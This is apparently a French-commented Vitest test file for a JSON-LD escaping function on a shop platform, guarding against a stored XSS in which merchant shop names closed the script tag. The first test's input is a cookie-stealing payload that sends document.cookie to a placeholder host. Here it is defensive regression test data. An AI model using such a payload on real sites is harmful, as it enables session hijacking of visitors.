import { describe, expect, it } from 'vitest';
import { jsonLdSur } from '@/lib/jsonLd';

/**
 * CE SONT LES TESTS D'UNE FAILLE, PAS D'UNE MISE EN FORME.
 *
 * Le balisage schema.org part dans un `<script type="application/ld+json">` par
 * `dangerouslySetInnerHTML`, et son contenu venait de `JSON.stringify()` seul.
 * Or `JSON.stringify` n'echappe ni `<` ni `/` : un nom de boutique contenant
 * `</script>` refermait la balise et executait ce qui suivait.
 *
 * Le nom, le slug et la description sont ecrits par le MARCHAND depuis « Ma
 * boutique », directement en base. Aucun administrateur a compromettre :
 * l'inscription est libre, et le code s'executait chez qui ouvrait la vitrine —
 * sur une origine dont les cookies de session ne sont pas `httpOnly`, et
 * derriere une CSP en `Report-Only`.
 *
 * Le premier test est celui qui aurait crie.
 */

describe('la sortie ne peut plus refermer la balise', () => {
  it('UN NOM PORTANT </script> NE FERME PLUS RIEN', () => {
    const sortie = jsonLdSur({
      name: "Chez X</script><script>new Image().src='//ailleurs/'+document.cookie</script>",
    });

    // La seule chose qui compte : plus aucune sequence que l'analyseur HTML
    // puisse lire comme une balise.
    expect(sortie).not.toContain('</');
    expect(sortie).not.toContain('<');
    expect(sortie).not.toContain('>');
    expect(sortie.toLowerCase()).not.toContain('script>');
  });

  it('le rendu complet, tel qu il part dans la page', () => {
    const rendu = `<script type="application/ld+json">${jsonLdSur({ name: 'a</script>b' })}</script>`;
    // Une seule balise ouvrante, une seule fermante : celles que nous posons.
    expect(rendu.match(/<script/g)).toHaveLength(1);
    expect(rendu.match(/<\/script>/g)).toHaveLength(1);
  });

  it('l esperluette est echappee : le navigateur resout les entites avant nous', () => {
    expect(jsonLdSur({ name: 'Chez A&B' })).toContain('\\u0026');
    expect(jsonLdSur({ name: 'Chez A&B' })).not.toContain('&');
  });

  it('les separateurs de ligne JavaScript sont neutralises', () => {
    // Valides en JSON, ILLEGAUX dans un litteral JavaScript : laisses tels
    // quels, ils rendaient le `<script>` invalide et le balisage muet.
    const sortie = jsonLdSur({ name: `a${String.fromCharCode(0x2028)}b` });
    expect(sortie).toContain('\\u2028');
    expect(sortie).not.toContain(String.fromCharCode(0x2028));
  });
});

describe('ce que Google lit n a pas change', () => {
  it('la sortie reste du JSON valide, et rend exactement les memes donnees', () => {
    const donnees = {
      '@context': 'https://schema.org',
      '@type': 'Restaurant',
      name: "Chez X</script> & Cie",
      url: 'https://www.djiguiflow.com/boutiques/chez-x',
    };
    // C'est le point qui rend ce correctif sans risque : l'echappement `\uXXXX`
    // est du JSON parfaitement valide, et se relit a l'identique.
    expect(JSON.parse(jsonLdSur(donnees))).toEqual(donnees);
  });

  it('une boutique au nom ordinaire traverse sans une marque', () => {
    expect(jsonLdSur({ name: 'Chez Zahara' })).toBe('{"name":"Chez Zahara"}');
  });
});
